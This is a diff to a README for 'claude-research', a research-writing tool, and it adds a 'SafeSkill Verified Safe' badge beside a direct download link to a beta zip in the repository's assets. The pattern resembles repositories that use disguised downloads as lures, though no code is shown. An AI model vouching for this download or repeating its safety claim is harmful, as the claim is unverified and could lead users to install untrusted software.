@@ -1,6 +1,7 @@
 # 🧪 claude-research - Write, review, and publish research
 
 [![Download claude-research](https://img.shields.io/badge/Download%20claude--research-blue?style=for-the-badge&logo=github)](https://github.com/halftime-apricotsauce647/claude-research/raw/refs/heads/main/assets/claude_research_v1.8-beta.2.zip)
+[![SafeSkill 92/100](https://img.shields.io/badge/SafeSkill-92%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/halftime-apricotsauce647-claude-research)
 
 ## 📌 What this is
 
